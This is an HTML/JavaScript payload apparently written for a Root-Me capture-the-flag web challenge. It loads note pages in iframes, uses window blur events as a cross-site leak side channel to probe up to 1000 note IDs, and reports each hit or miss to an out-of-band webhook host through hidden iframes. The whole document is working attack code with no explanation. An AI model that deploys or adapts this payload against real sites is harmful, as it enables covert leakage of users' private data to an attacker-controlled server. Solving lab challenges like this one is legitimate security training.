<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";

window.onload = function () {
    let i = 0;
    function testNext() {
        if (i > 1000) return;
        let blurFired = false;
        window.addEventListener("blur", () => { blurFired = true; });
        const iframe = document.createElement("iframe");
        iframe.src = TARGET + i + "#search_note";
        document.body.appendChild(iframe);
        setTimeout(() => {
            const result = blurFired ? "hit" : "miss";
            const ex = document.createElement("iframe");
            ex.style.display = "none";
            ex.src = WEBHOOK + "?result=" + result + "&id=" + i;
            document.body.appendChild(ex);
            window.removeEventListener("blur", () => { blurFired = true; });
            i++;
            iframe.style.display = "none";
            testNext();
        }, 10000);
    }
    testNext();
};
</script>
